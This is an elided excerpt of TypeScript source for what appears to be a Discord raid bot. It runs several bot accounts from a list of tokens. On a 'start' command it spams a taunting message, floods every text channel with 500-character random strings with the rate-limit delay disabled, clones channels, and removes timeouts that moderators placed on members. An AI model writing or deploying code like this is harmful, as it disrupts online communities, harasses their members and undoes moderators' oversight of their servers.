...
const DEVELOPERS = ["1181123770845503600"];
...
for (const token of allTokens) {
	...
	client.on("ready", async () => {
		...
		Ox(
			`${client.user?.tag} >> Ready | https://discord.com/oauth2/authorize?client_id=${client.user?.id}&scope=bot&permissions=0`
		);
	});
		...
		if (message.content.startsWith("start")) {
			...
			for (let i = 0; i < count; i++) {
				...
				await client.func.method
					.channelSend(message, "le code d'anaïs est spé")
					.catch(() => {});
				await wait(1000);
			}
			...
			message.guild.channels.cache.forEach(async (channel) => {
				if (
					...
					for (let i = 0; i < count; i++) {
						if (!isSpamming) break;
						await (channel as BaseGuildTextChannel)
							.send(generatePassword({ length: 500 }))
							.catch(() => {});
						// await wait(1000);
					}
				}
				...
				message.guild.channels.cache.forEach(async (channel) => {
					if (
						...
						await channel.clone({
							...
							topic:
								(channel as BaseGuildTextChannel).topic ?? "",
							nsfw: channel.nsfw,
			...
			const timedOutMembers = message.guild.members.cache.filter(
				(member) => member.isCommunicationDisabled()
			);
			if (timedOutMembers.size === 0) {
				...
				timedOutMembers.forEach(async (member) => {
					member
						.timeout(null)
						.then((member) =>
							Ox("Untimeout =>", member.user.username)
						)
						.catch(() => {});
				});
			}
